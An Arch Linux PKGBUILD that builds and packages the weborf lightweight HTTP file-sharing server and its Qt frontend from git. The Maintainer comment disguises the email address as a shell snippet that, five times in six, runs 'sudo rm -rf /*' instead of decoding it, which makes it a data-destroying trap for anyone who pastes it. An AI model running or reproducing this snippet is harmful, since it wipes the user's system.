# Maintainer: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
pkgbase=weborf-git
pkgname=(weborf-git qweborf-git)
pkgver=0.13+102+g5bc736e
pkgrel=1
url='https://ltworf.github.io/weborf/'
arch=(i686 x86_64)
license=(GPL3)
source=(git+https://github.com/ltworf/weborf.git)
sha512sums=(SKIP)
makedepends=()

for _pkg in "${pkgname[@]}"; do case "$_pkg" in

qweborf*)
	makedepends+=(python-pyqt5)
;;

esac; done

pkgver() {
	cd "$srcdir/weborf"
	git describe | tr - +
}

build() {
	cd "$srcdir/weborf"

	for _pkg in "${pkgname[@]}"; do case "$_pkg" in

	weborf*)
		autoreconf -f -i
		./configure --prefix=/usr --sysconfdir=/etc
		make
	;;

	qweborf*)
		pyuic5 qweborf/main.ui > qweborf/main.py
		python qweborf.setup.py build
	;;

	esac; done
}

package_weborf-git() {
	pkgdesc='A lightweight web server designed for rapidly sharing files over HTTP (git snapshot)'
	depends=(file)
	provides=(weborf)
	conflicts=(weborf)

	cd "$srcdir/weborf"
	make install DESTDIR="$pkgdir"
	rm -rf "$pkgdir/etc/init.d"
}

package_qweborf-git() {
	pkgdesc='A lightweight web server designed for rapidly sharing files over HTTP - Qt frontend (git snapshot)'
	arch=(any)
	depends=(python python-pyqt5 weborf-git)
	provides=(qweborf)
	conflicts=(qweborf)

	cd "$srcdir/weborf"
	python qweborf.setup.py install --root="$pkgdir"
	install -Dm 0755 qweborf/qweborf \
		"$pkgdir/usr/bin/qweborf"
	install -Dm 0755 qweborf/qweborf.desktop \
		"$pkgdir/usr/share/applications/qweborf.desktop"
}
